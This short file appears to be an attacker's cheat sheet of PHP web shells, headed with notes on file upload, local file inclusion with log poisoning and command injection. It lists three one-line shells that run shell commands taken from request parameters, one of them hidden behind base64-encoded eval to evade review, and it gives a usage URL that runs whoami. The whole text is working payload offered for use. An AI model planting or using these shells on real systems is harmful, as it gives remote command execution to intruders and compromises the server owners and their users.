# File upload? LFI + log poison? Command Inj?
# Basic GET Shell
<?php system($_GET['cmd']); ?>
# Usage = http://qolt45exe/shell.php?cmd=whoami
# Base64 Obfuscation Variant
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
#
<?php echo shell_exec($_REQUEST['cmd']); ?>
